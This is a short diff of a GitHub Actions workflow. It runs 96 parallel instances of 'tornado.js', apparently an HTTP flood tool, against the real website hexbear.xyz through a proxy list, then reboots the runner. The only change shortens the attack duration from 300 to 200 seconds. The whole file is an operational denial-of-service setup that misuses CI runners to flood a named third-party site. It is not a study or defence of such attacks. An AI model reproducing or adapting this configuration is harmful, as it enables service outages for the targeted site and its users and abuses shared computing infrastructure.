@@ -21,7 +21,7 @@ jobs:
           chmod +x tornado.js
           PIDS=()
           for i in {1..96}; do
-            timeout 300 node tornado.js GET https://hexbear.xyz/ 300 16 128 proxies.txt --full --query 3
+            timeout 200 node tornado.js GET https://hexbear.xyz/ 200 16 128 proxies.txt --full --query 3
             PIDS+=($!)
           done
           
@@ -30,7 +30,7 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 300
+        run: sleep 200
         
       - name: OK !
         run: sudo reboot
